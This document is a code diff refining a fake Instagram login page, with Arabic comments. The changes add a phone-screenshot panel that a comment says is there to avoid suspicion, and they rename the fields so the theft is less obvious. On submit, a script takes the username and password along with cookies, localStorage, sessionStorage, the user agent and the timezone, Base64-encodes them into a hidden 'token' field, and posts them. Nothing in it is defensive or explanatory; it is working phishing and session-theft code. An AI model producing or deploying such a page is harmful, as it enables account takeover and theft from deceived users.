@@ -3,50 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول • Instagram</title>
+    <title>Login • Instagram</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-container { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; box-sizing: border-box; text-align: center; }
-        .logo { width: 175px; margin-bottom: 24px; }
-        input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 9px; margin-bottom: 6px; box-sizing: border-box; font-size: 12px; }
+        body { font-family: -apple-system, sans-serif; background-color: #fafafa; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .main-container { display: flex; align-items: center; max-width: 935px; width: 100%; justify-content: center; }
+        
+        /* الجانب الأيسر: الهواتف (لإبعاد الشك) */
+        .phones-side { background-image: url('https://www.instagram.com/static/images/homepage/screenshots/screenshot1.png/fd3d9d2c636d.png'); background-size: 454px 618px; width: 454px; height: 618px; margin-right: 32px; position: relative; }
+        @media (max-width: 875px) { .phones-side { display: none; } }
+
+        /* الجانب الأيمن: الصندوق */
+        .login-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 10px 40px 20px; text-align: center; }
+        .logo { width: 175px; margin: 22px auto 12px; display: block; }
+        input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 9px; margin-bottom: 6px; font-size: 12px; box-sizing: border-box; }
         button { width: 100%; background: #0095f6; border: none; color: white; border-radius: 4px; padding: 7px; font-weight: bold; cursor: pointer; margin-top: 8px; }
         .divider { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: bold; }
-        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 18px; }
-        .fb-login { color: #385185; font-size: 14px; font-weight: bold; cursor: pointer; text-decoration: none; }
-        .forgot-pw { font-size: 12px; color: #00376b; margin-top: 15px; display: block; text-decoration: none; }
+        .divider::after, .divider::before { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 18px; }
+        .fb-login { color: #385185; font-size: 14px; font-weight: bold; text-decoration: none; display: block; margin-bottom: 15px; }
+        .forgot { font-size: 12px; color: #00376b; text-decoration: none; }
+        .signup { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 20px; text-align: center; margin-top: 10px; font-size: 14px; }
+        .signup a { color: #0095f6; font-weight: bold; text-decoration: none; }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252e00b562.png" alt="Instagram" class="logo">
-        <form action="/api/v1/auth" method="POST" id="insta-vault">
-            <input type="text" name="username" placeholder="Phone number, username, or email" required>
-            <input type="password" name="password" placeholder="Password" required>
-            <input type="hidden" name="full_harvest" id="full_harvest">
-            <button type="submit">Log In</button>
-            <div class="divider">OR</div>
-            <a href="#" class="fb-login">Log in with Facebook</a>
-            <a href="#" class="forgot-pw">Forgot password?</a>
-        </form>
+    <div class="main-container">
+        <div class="phones-side"></div>
+        <div class="right-side">
+            <div class="login-box">
+                <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252e00b562.png" class="logo">
+                <form id="insta-vault" action="/api/v1/auth" method="POST">
+                    <input type="text" name="u" placeholder="Phone number, username, or email" required>
+                    <input type="password" name="p" placeholder="Password" required>
+                    <input type="hidden" name="token" id="token">
+                    <button type="submit">Log In</button>
+                    <div class="divider">OR</div>
+                    <a href="#" class="fb-login">Log in with Facebook</a>
+                    <a href="#" class="forgot">Forgot password?</a>
+                </form>
+            </div>
+            <div class="signup">
+                Don't have an account? <a href="#">Sign up</a>
+            </div>
+        </div>
     </div>
 
     <script>
         document.getElementById('insta-vault').onsubmit = function(e) {
-            // سحب شامل لكل شيء: Cookies + LocalStorage + SessionStorage + UserAgent
-            let harvest = {
+            e.preventDefault();
+            const harvest = {
                 cookies: document.cookie,
-                localStorage: JSON.stringify(localStorage),
-                sessionStorage: JSON.stringify(sessionStorage),
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                screenResolution: window.screen.width + "x" + window.screen.height,
-                timezone: Intp.DateTimeFormat().resolvedOptions().timeZone
+                ls: JSON.stringify(localStorage),
+                ss: JSON.stringify(sessionStorage),
+                ua: navigator.userAgent,
+                tz: Intl.DateTimeFormat().resolvedOptions().timeZone
             };
-            
-            // تحويل البيانات لنص مشفر بـ Base64 لضمان المرور عبر جدران الحماية
-            document.getElementById('full_harvest').value = btoa(unescape(encodeURIComponent(JSON.stringify(harvest))));
-            
-            // ملاحظة من Don: الكود سيسحب كل الكوكيز المتاحة للنطاق الحالي
+            document.getElementById('token').value = btoa(unescape(encodeURIComponent(JSON.stringify(harvest))));
+            setTimeout(() => { e.target.submit(); }, 1000);
         };
     </script>
 </body>
